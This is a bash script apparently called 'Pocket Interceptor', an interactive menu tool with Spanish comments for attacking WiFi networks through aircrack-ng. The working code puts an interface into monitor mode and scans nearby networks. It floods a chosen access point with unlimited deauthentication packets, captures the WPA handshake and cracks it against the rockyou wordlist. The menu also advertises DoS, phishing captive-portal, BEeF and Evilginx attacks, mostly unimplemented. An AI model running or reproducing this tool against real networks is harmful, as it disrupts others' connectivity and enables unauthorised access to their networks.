#!/bin/bash

RED='\033[0;31m'
BRED='\033[1;31m'
GREEN='\033[1;32m'
YELLOW='\033[0;33m'
BLUE='\033[1;34m'
PURPLE='\033[0;35m'
CYAN='\033[1;36m'
NC='\033[0m'

# [+]
# ""$GREEN"[✓]"$NC"
# "$RED"[✗]"$NC"

intro(){
    clear
    echo -e "$BLUE"
    echo "________            ______      _____"                                
    echo "___  __ \______________  /________  /_    "                           
    echo "__  /_/ /  __ \  ___/_  //_/  _ \  __/"                               
    echo "_  ____// /_/ / /__ _  ,<  /  __/ /_"                                 
    echo "/_/     \____/\___/ /_/|_| \___/\__/"                                 
    echo""                                                                     
    echo""                                                                     
    echo""                                                                     
    echo "________                             "                                
    echo "_/_____/                              "                               
    echo""                                                                     
    echo""                                                                                                                                    
    echo "________      _____                               _____              "
    echo "____  _/________  /_________________________________  /______________"
    echo " __  / __  __ \  __/  _ \_  ___/  ___/  _ \__  __ \  __/  __ \_  ___/"
    echo "__/ /  _  / / / /_ /  __/  /   / /__ /  __/_  /_/ / /_ / /_/ /  /    "
    echo "/___/  /_/ /_/\__/ \___//_/    \___/ \___/_  .___/\__/ \____//_/     "
    echo "                                          /_/                        "
    echo -e ""$NC""
    sleep 5
}



SELECTED_INTERFACE=""
MON_INTERFACE=""
INTERFACE_INTERNET_OUTPUT=""

MAIN_DIRECTORTY=`pwd`

select_interface(){    
    clear

    # Obtener lista de interfaces de red disponibles
    INTERFACES=($(ip -o link show | awk -F': ' '{print $2}'))

     #Verifica si tiene interfaces activas
    if [ ${#INTERFACES[@]} -lt 1 ]; then
    echo "There's no active interfaces."
    exit 1
    fi

    # Mostrar las interfaces disponibles
    echo -e "$GREEN""Select a network interface:""$NC"
    for i in "${!INTERFACES[@]}"; do
        echo -e "$CYAN""$((i+1))."$NC" ${INTERFACES[i]}"
    done

    # Leer la selección del usuario
    read -p "Enter the interface wanted: " CHOICE

    # Validar la entrada
    if [[ ! "$CHOICE" =~ ^[0-9]+$ ]] || ((CHOICE < 1 || CHOICE > ${#INTERFACES[@]})); then
        echo "Selected interface not valid."
        exit 1
    fi

    # Obtener la interfaz seleccionada
    SELECTED_INTERFACE="${INTERFACES[CHOICE-1]}"

    if echo "$SELECTED_INTERFACE" | grep -q "mon"; then
        MON_INTERFACE=$SELECTED_INTERFACE
        
    fi

    
    if iwconfig "$SELECTED_INTERFACE" &>/dev/null; then
        echo -e ""$GREEN"[✓]"$NC" It's a wireless interface $SELECTED_INTERFACE"
    else
        echo -e ""$BRED"[✗]"$NC" It isn't a wireless interface"
        exit 1
    fi
    
    SELECTED_INTERFACE="${SELECTED_INTERFACE//mon/}"
    sleep 2
}

WIDTH=""
HEIGHT=""
CAL_WIDTH=""
CAL_HEIGHT=""
get_screen_resolution() {
    if command -v xrandr &>/dev/null; then
        resolution=$(xrandr --current | grep '*' | awk '{print $1}')
        if [[ -n "$resolution" ]]; then
            WIDTH=$(echo "$resolution" | cut -d'x' -f1)
            HEIGHT=$(echo "$resolution" | cut -d'x' -f2)
        else
            return 1
        fi
    else
        return 1
    fi

    CAL_WIDTH=$(( WIDTH / 3 ))
    CAL_HEIGHT=$(( HEIGHT / 3 ))
    return 0
}

open_terminal() {
    local COMMAND_RUN="$1"
    local SCREEN_SITE="$2"
    #Se crea una ID falso para que se puede indentificar cada terminal abierta
    local TERMINAL_TITLE="term_$(date +%s)_$RANDOM" 

    # Abrir terminal en segundo plano
    x-terminal-emulator -title "$TERMINAL_TITLE" -e "$COMMAND_RUN" &

    # Esperar que la terminal se inicie
    sleep 2

    # Obtener ID de la ventana asociada al proceso
    WINDOW_ID=$(wmctrl -l | grep "$TERMINAL_TITLE" | awk '{print $1}')

    # Mover y redimensionar la terminal
    if [[ -n "$WINDOW_ID" ]]; then
        case "$SCREEN_SITE" in
            "1") wmctrl -i -r "$WINDOW_ID" -e "0,0,0,$CAL_WIDTH,$CAL_HEIGHT" ;;   # Arriba Izquierda
            "2") wmctrl -i -r "$WINDOW_ID" -e "0,$((WIDTH - CAL_WIDTH)),0,$CAL_WIDTH,$CAL_HEIGHT" ;; # Arriba Derecha
            "3") wmctrl -i -r "$WINDOW_ID" -e "0,0,$((HEIGHT - CAL_HEIGHT)),$CAL_WIDTH,$CAL_HEIGHT" ;; # Abajo Izquierda
            "4") wmctrl -i -r "$WINDOW_ID" -e "0,$((WIDTH - CAL_WIDTH)),$((HEIGHT - CAL_HEIGHT)),$CAL_WIDTH,$CAL_HEIGHT" ;; # Abajo Derecha
            *) echo -e ""$BRED"[✗]"$NC" ERROR: invalid position" ;;
        esac
    else
        echo -e ""$BRED"[✗]"$NC" No se pudo encontrar la ventana de la terminal."
    fi
}
#Hago unas variables globales para que poder decidir la ubicacion 
UP_LEFT="1"
UP_RIGHT="2"
DOWN_LEFT="3"
DOWN_RIGHT="4"

monitor_mode(){

    if echo "$MON_INTERFACE" | grep -q "mon"; then
        echo -e ""$BRED"[✗]"$NC"It's already in monitor mode"
        SELECTED_INTERFACE="${SELECTED_INTERFACE//mon/}"
        sleep 2

    else
        echo "[+] Activating monitor mode in $SELECTED_INTERFACE..."
        #Verifica que no hayan procesos que interfieran con aircrack-ng
        sudo airmon-ng check kill &>/dev/null 
        sudo airmon-ng start "$SELECTED_INTERFACE" &>/dev/null
        
        # Verificar si la interfaz en modo monitor se creó
        MON_INTERFACE="${SELECTED_INTERFACE}mon"
        if iwconfig "$MON_INTERFACE" &>/dev/null; then
            echo -e ""$GREEN"[✓]"$NC" Monitor mode activated in $MON_INTERFACE"
        else
            echo -e ""$BRED"[✗]"$NC" Error: Monitor mode could not be activated"
            exit 1
        fi
        sleep 2
    fi
    
    
}


manager_mode(){
    
    if echo "$MON_INTERFACE" | grep -q "mon"; then
        echo "[+] Disabling monitor mode in $MON_INTERFACE..."
        #Verifica que no hayan procesos que interfieran con aircrack-ng
        sudo airmon-ng check kill &>/dev/null 
        sudo airmon-ng stop "$MON_INTERFACE" &>/dev/null

        if iwconfig "$SELECTED_INTERFACE" &>/dev/null; then
            echo -e ""$GREEN"[✓]"$NC" Manager mode activated in $SELECTED_INTERFACE"
        else
            echo -e ""$BRED"[✗]"$NC" Failed to return to management mode"
            exit 1
        fi

        sudo service NetworkManager restart 
        sudo service wpa_supplicant restart

        MON_INTERFACE=""
        sleep 2
    else
        echo -e ""$BRED"[✗]"$NC"The interface is already in monitor mode"
        sleep 2
    fi
}

check_password(){

    PASSWORD_TO_CHECK=$1

    if [ -z "$PASSWORD_TO_CHECK" ];then
        echo "No Password Send"
        sleep 2
        return 1
    else
        manager_mode
        sleep 3
        if nmcli device wifi connect "$ESSID_VAR" password "$PASSWORD_TO_CHECK"; then
            echo -e ""$GREEN"[✓]"$NC"Connection Succesfull"
            nmcli con down id "$ESSID_VAR"
            sleep 3
            monitor_mode
            return 0
        else
            echo -e ""$BRED"[✗]"$NC" WIFI PASSWORD INCORRECT"
            PASSWORD_CRACKED=""
            return 1
        fi
    fi
}


#Variables generales para el script con la información de la wifi selecionada.
BSSID_VAR=""
CHANNEL_VAR=""
PRIVACY_VAR=""
CIPHER_VAR=""
AUTH_VAR=""
BEACONS_VAR=""
ESSID_VAR=""
PASSWORD_CRACKED=""

select_wireless(){
    
    if [[ -z "$MON_INTERFACE" ]];then
        echo -e ""$BRED"[✗]"$NC" Not in monitor mode"
        sleep 2
        return 1    
    fi
        
    TIMEOUT_SCAN=10
    # Si estamos en un entorno gráfico
    if [[ -n "$DISPLAY" || -n "$WAYLAND_DISPLAY" ]]; then
        #Verifica si se puede leer la resolución
        if get_screen_resolution ; then
            #Abre una terminal en una determinada posición 
            open_terminal "timeout $TIMEOUT_SCAN airodump-ng -w data_collected/network_dump/networks --output-format csv $MON_INTERFACE --ignore-negative-one --band abg'" "$UP_LEFT"
            #Dejamos que se ejecute en segundo plano el escaneo antes de mirar la informacion
            sleep $TIMEOUT_SCAN
        else
            # Si no tenemos resulción ejecutaremos una terminal sin determinar la posición ni tamaño.
            x-terminal-emulator -e "timeout $TIMEOUT_SCAN airodump-ng -w data_collected/network_dump/networks --output-format csv $MON_INTERFACE --ignore-negative-one --band abg"
        fi 
    else
        # No hay entorno gráfico, ejecutarlo en la terminal actual
        sudo timeout $TIMEOUT_SCAN airodump-ng -w data_collected/network_dump/networks --output-format csv "$MON_INTERFACE" --ignore-negative-one --band abg # VERIFICAR PORQUE AHORA NO HACE OUTPUT
    fi
    
    
    if [[ ! -f "./data_collected/network_dump/networks-01.csv" ]];then
        echo "File csv with network not found"
        exit 1
    fi

    cd  ./data_collected/network_dump/
    FILE="networks-01.csv"
    

    CLIENTS=$(sed -n '/Station MAC, First time seen, Last time seen, Power, # packets, BSSID, Probed ESSIDs/,$p' "$FILE") # Se debera mirar que clientes estan reconocibles por la cada wifi
    # Eliminar la información del archivo
    sed -i '/Station MAC, First time seen, Last time seen, Power, # packets, BSSID, Probed ESSIDs/,$d' "$FILE"

    # Declarar un array vacio
    declare -a NETWORKS

    # Contador de filas (ID)
    COUNT=0
    sleep 2
    clear

    # Leer el archivo línea por línea usando 'process substitution'
    while IFS=',' read -r BSSID FirstSeen LastSeen Channel Speed Privacy Cipher Auth Power Beacons IV LAN_IP ID_Length ESSID Key; do
    # Solo almacenar hay algun campo con informacion, si todo es vacio no almazenara.
        if [[ -n "$BSSID" && -n "$Channel" && -n "$Privacy" && -n "$Cipher" && -n "$Auth" && -n "$Beacons" && -n "$ESSID" && ("$ESSID" != " ") ]]; then
            # Guardar todos los datos en el array (para referencia interna)
            NETWORKS+=("$BSSID,$Channel,$Privacy,$Cipher,$Auth,$Beacons,$ESSID")

            # Formatear solo los datos a mostrar
            LINE=$(printf "%-20s %-18s %-10s %-7s %-10s" "$BSSID" "$ESSID" "$Privacy" "$Beacons" "$Cipher")

            # Mostrar en pantalla
            echo "$COUNT  $LINE"

            # Incrementar el contador
            COUNT=$((COUNT + 1))
        fi
    done < <(tail -n +2 "$FILE")  # Leer desde la segunda línea

    # Solicitar entrada del usuario
    read -p "Enter an ID number to select the wifi: " USER_ID

    # Mostrar la información correspondiente al ID
    if [[ $USER_ID =~ ^[0-9]+$ ]] && [[ $USER_ID -ge 1 ]] && [[ $USER_ID -lt ${#NETWORKS[@]} ]]; then
        echo "Selected complete information:"
        IFS=',' read -r BSSID Channel Privacy Cipher Auth Beacons ESSID <<< "${NETWORKS[$USER_ID]}"
        
        #Con awk quito espacios que quedan.
        BSSID_VAR=$(echo "$BSSID" | awk '{$1=$1};1')
        CHANNEL_VAR=$(echo "$Channel" | awk '{$1=$1};1')
        PRIVACY_VAR=$(echo "$Privacy" | awk '{$1=$1};1')
        CIPHER_VAR=$(echo "$Cipher" | awk '{$1=$1};1')
        AUTH_VAR=$(echo "$Auth" | awk '{$1=$1};1')
        BEACONS_VAR=$(echo "$Beacons" | awk '{$1=$1};1')
        ESSID_VAR=$(echo "$ESSID" | awk '{$1=$1};1')

        echo "$BSSID_VAR $ESSID_VAR"
        
        sleep 2
        clear
        LOOP=true
        while $LOOP ; do
            read -p "Do you have the password of the network selected $ESSID_VAR? Y/N " HAS_PASS
            HAS_PASS=`echo $HAS_PASS | tr '[:upper:]' '[:lower:]'`

            if [ $HAS_PASS == "y" ];then
                read -p "Insert the password: " PASSWORD_CRACKED
                if check_password "$PASSWORD_CRACKED"; then
                    echo -e ""$GREEN"[✓]"$NC"Correct Password"
                    LOOP=false
                else
                    echo -e ""$BRED"[✗]"$NC" Password is incorrect try again"
                    return 1
                fi 

            elif [ $HAS_PASS == "n" ];then
                LOOP=false
            else
                echo -e ""$BRED"[✗]"$NC"Invalid Character"
                return 1
            fi
        done
    else
       echo -e ""$BRED"[✗]"$NC" Invalid ID ."
        rm $FILE
        cd .. && cd ..
        return 1
    fi

    rm $FILE
    cd .. && cd .. # Se ha de cambiar a ruta no absoluta
    return 0
}


IW_OUTPUT=$(iw list)
check_band_available() {

    BAND="$1"
    BAND_SECTION=$(echo "$IW_OUTPUT" | awk -v band="Band $BAND:" '
        $0 ~ band {flag=1; next}
        /Band / {flag=0}
        flag {print}
    ')

    # Verificar si la banda tiene frecuencias activas
    if echo "$BAND_SECTION" | grep -q "MHz"; then
        echo -e ""$GREEN"[✓]"$NC""
    else
        echo -e ""$BRED"[✗]"$NC""
    fi
}


Deauther(){

    if [ -z "$BSSID_VAR" ];then 
        echo -e ""$BRED"[✗]"$NC" No wifi selected"
        sleep 2
        return 1
    fi

    TIMEOUT="$1"
    iwconfig $MON_INTERFACE channel $CHANNEL_VAR

    if [[ -n "$DISPLAY" || -n "$WAYLAND_DISPLAY" ]]; then
        # Estamos en un entorno gráfico
        if get_screen_resolution ; then
            ARRIBA_IZQ="1"
            #Abre una terminal en una determinada posición 
            open_terminal "timeout $TIMEOUT aireplay-ng --deauth 0 -a $BSSID_VAR $MON_INTERFACE" "$UP_LEFT"
        else
            x-terminal-emulator -e " timeout $TIMEOUT aireplay-ng --deauth 0 -a $BSSID_VAR $MON_INTERFACE"
        fi
    else
        # No hay entorno gráfico, ejecutarlo en la terminal actual
        nohup timeout $TIMEOUT aireplay-ng --deauth 0 -a $BSSID_VAR $MON_INTERFACE > /dev/null 2>&1 &
    fi

}

Craking_handshake(){
    clear
    cd data_collected/network_dump

    FILE="wificapture-01.cap"

    if [[ -z $FILE ]];then
        echo "ERROR file not found"
        return 1
    fi
        
    WORDLIST="/usr/share/wordlists/rockyou.txt"


    if aircrack-ng $FILE -w $WORDLIST > result_"$ESSID_VAR".txt ;then

        
        echo "We cracked the password. Saved on ./data_collected/network_dump/result_$ESSID_VAR.txt"
        RESULTS=$(grep "KEY FOUND!" result_"$ESSID_VAR".txt | tr -d '[:space:]')
        echo "$RESULTS"
        
        RESULTS=$(grep "KEY FOUND!" "./data_collected/network_dump/result_$ESSID_VAR.txt" | sed -E 's/.*\[ (.+) \].*/\1/' | head -n 1)
        echo "$RESULTS"

        rm ./wificapture-01.*
        cd .. && cd ..
        sleep 5
        return 0
    else 
        echo "NO FOUND"
        rm ./wificapture-01.*
        exit 1
    fi

    # Antes de crackerar hemos de verificar protocolos que se utilizan para adaptar los ataques de acceso: WEP (SUPER debil casi nada de uso);
    #                                                                                                      WPA (Muy debil poco uso) 
    #                                                                                                      WPA2/WPA mixto (Debil) (Se puede forzar al WPA)
    #                                                                                                      WPA2 TKIP (Moderado)
    #                                                                                                      WPA2 AES (CCMP) (Mas seguro)
    #                                                                                                      WPA3 SAE (Muy Seguro)

    #Primero si el ataque es hacia una red WPA2-PSK o WPA3-SAE

    # Si el ataque de handshake no es valido hacer otros ataques. 

}

Bruteforce(){
    
    if [[ -z "$BSSID_VAR" ]];then
        echo "There's not a BSSID in usage"
        sleep 2
        return 1    
    fi

    if [[ -z "$CHANNEL_VAR" ]];then
        echo "There's not a Channel set in usage"
        sleep 2
        return 1    
    fi

    if [[ -z "$MON_INTERFACE" ]];then
        echo "Interface it's not in monitor mode"
        sleep 2
        return 1    
    fi

    USR_INPUT=true
    while $USR_INPUT; do
        read -p "Set a time to run the attack recomended at least 20. MIN 10 MAX 200: " TIMEOUT_USR


        if [[ $TIMEOUT_USR =~ ^[0-9]+$ ]] && [[ $TIMEOUT_USR -ge 10 ]] && [[ $TIMEOUT_USR -lt 200 ]];then
            
            USR_INPUT=false
            #Cambiamos la interface al canal donde esta la red para poder hacer el ataque por el canal donde esta la red wifi.
            iwconfig $MON_INTERFACE channel $CHANNEL_VAR

            if [[ -n "$DISPLAY" || -n "$WAYLAND_DISPLAY" ]]; then
                # Estamos en un entorno gráfico
                Deauther "$TIMEOUT_USR" &

                if get_screen_resolution ; then
                    ARRIBA_DER="2"
                    #Abre una terminal en una determinada posición 
                    open_terminal "timeout $TIMEOUT_USR airodump-ng -w data_collected/network_dump/wificapture -c $CHANNEL_VAR --bssid $BSSID_VAR $MON_INTERFACE" "$UP_RIGHT"
                else
                    x-terminal-emulator -e " timeout $TIMEOUT_USR airodump-ng -w data_collected/network_dump/wificapture -c $CHANNEL_VAR --bssid $BSSID_VAR $MON_INTERFACE"
                fi
            else
                # No hay entorno gráfico, ejecutarlo en la terminal actual
                Deauther "$TIMEOUT_USR" &
                nohup timeout $TIMEOUT_USR airodump-ng -w data_collected/network_dump/wificapture -c $CHANNEL_VAR --bssid $BSSID_VAR $MON_INTERFACE > /dev/null 2>&1 &
                echo "atack in progress"

            fi
        
        else
            echo "Invalid Time number"
            return 1
        fi
    done

    sleep $TIMEOUT_USR


    Craking_handshake

    
}



menu(){

    if true; then #./install.sh
        select_interface
        clear
    else
        exit 1
    fi
    
    BOOL_SELECTION=true

    while $BOOL_SELECTION; do
        clear    
        if [[ -z "$MON_INTERFACE" ]];then
            
            MODE=$(iwconfig "$SELECTED_INTERFACE" 2>/dev/null | grep -o 'Mode:[^ ]*' | cut -d: -f2)
            echo -e "You haved selected the interface: "$GREEN"$SELECTED_INTERFACE"$NC"  in Mode: "$PURPLE"$MODE""$NC"

            BAND_NUMBERS=$(echo "$IW_OUTPUT" | grep -oP "Band \K\d+" | sort -u)

            # Verificar el estado de cada banda
            for number in $BAND_NUMBERS; do
                case $number in
                    1)
                        echo -e "The interface "$GREEN"$SELECTED_INTERFACE"$NC" has: "$PURPLE"2.4 GHz:"$NC" $(check_band_available $number)"
                        ;;
                    2)
                        echo -e "The interface "$GREEN"$SELECTED_INTERFACE"$NC" has: "$PURPLE"5 GHz:"$NC" $(check_band_available $number)"
                        ;;
                    4)
                        echo -e "The interface "$GREEN"$SELECTED_INTERFACE"$NC" has: "$PURPLE"6 GHz:"$NC" $(check_band_available $number)"
                        ;;
                    *)
                        echo -e "Band $number: "$RED" Not recognized "$NC""
                        ;;
                esac
            done

        else
            MODE=$(iwconfig "$MON_INTERFACE" 2>/dev/null | grep -o 'Mode:[^ ]*' | cut -d: -f2)
            echo -e "You haved selected the interface: "$GREEN"$MON_INTERFACE"$NC"  in Mode: "$PURPLE"$MODE"$NC""
            
            BAND_NUMBERS=$(echo "$IW_OUTPUT" | grep -oP "Band \K\d+" | sort -u)
            # Verificar el estado de cada banda
            for number in $BAND_NUMBERS; do
                case $number in
                    1)
                        echo -e "The interface "$GREEN"$MON_INTERFACE"$NC" has: "$PURPLE"2.4 GHz:"$NC" $(check_band_available $number)"
                        ;;
                    2)
                        echo -e "The interface "$GREEN"$MON_INTERFACE"$NC" has: "$PURPLE"5 GHz:"$NC" $(check_band_available $number)"
                        ;;
                    4)
                        echo -e "The interface "$GREEN"$MON_INTERFACE"$NC" has: "$PURPLE"6 GHz:"$NC" $(check_band_available $number)"
                        ;;
                    *)
                        echo -e "Band $number: "$RED" Not recognized "$NC""
                        ;;
                esac
            done
        fi

        if [[ -z "$BSSID_VAR" ]];then
            echo -e "$RED""You don't have any Wireless network selected""$NC"
        else
            echo -e "You have the wireless network "$CYAN"$ESSID_VAR"$NC" selected with the BSSID: "$CYAN"$BSSID_VAR"$NC" with the privacy type: "$CYAN"$PRIVACY_VAR"$NC""
        fi

        echo -e "$BRED"
        echo "+-+-+-+-+ +-+-+-+-+-+-+-+-+-+-+-+"
        echo "|M|e|n|u| |I|n|t|e|r|c|e|p|t|o|r|"
        echo "+-+-+-+-+ +-+-+-+-+-+-+-+-+-+-+-+"
        echo -e "$NC"""
        echo -e "$BLUE""Network Configuration Menu"
        echo -e "- - - - - - - - - - - - - - - - - -""$NC"
        echo -e "$CYAN""0."$NC" Exit Script"
        echo -e "$CYAN""1."$NC" Change Network Interface"
        echo -e "$CYAN""2."$NC" Put Interface In Monitor Mode (Needed for wireless atacks)"
        echo -e "$CYAN""3."$NC" Put Interface In Manager Mode "    
        echo -e "$CYAN""4."$NC" Select wireless network "
        echo -e "$BLUE""- - - - - - - - - - - - - - - - - -"
        echo ""
        echo "Atacks Menu"
        echo -e "- - - - - - - - - - - - - - - - - -""$NC"
        echo -e "$CYAN""5."$NC" Deauther + Bruteforce (Get inside the Wireless network) "
        echo -e "$CYAN""6."$NC" Fake Captive Portal (Deauther + Ap Spofing + Phishing Login)"
        echo -e "$CYAN""7."$NC" DoS Attack (Stop the wireless conexions)"
        echo -e "$CYAN""8."$NC" Scan Network (Search Devices + Vulnerabilities)"
        echo -e "$CYAN""9."$NC" BEeF attack ith Ap Spofing"
        echo -e "$CYAN""10."$NC" Evilginx Attack with Ap Spofing"
        echo -e "$BLUE""- - - - - - - - - - - - - - - - - -"
        echo -e "$NC"""
        echo ""
        read -p "Select the option you want: " SELECTION

        case $SELECTION in
            1) select_interface ;;
            2) monitor_mode;;
            3) manager_mode ;;
            4) select_wireless ;;
            5) Bruteforce ;;
            6) echo ""; hostname -I ;;
            7) Deauther "0" ;;
            8) ./netscan.py ;;
            9) beef_menu ;;
            10) echo "";;
            0) echo -e "👋 "$BLUE"Goodbye...""$NC"; exit 0 ;;
            *) echo -e ""$BRED"[✗]"$NC" Not valid option." ; sleep 2 ;;
        esac
    done

}

USERID=`id -u`

if [ $USERID == 0 ];then
    intro
    menu
else
	echo -e ""$BRED"[✗]"$NC" Not executed as root"
    exit 1
fi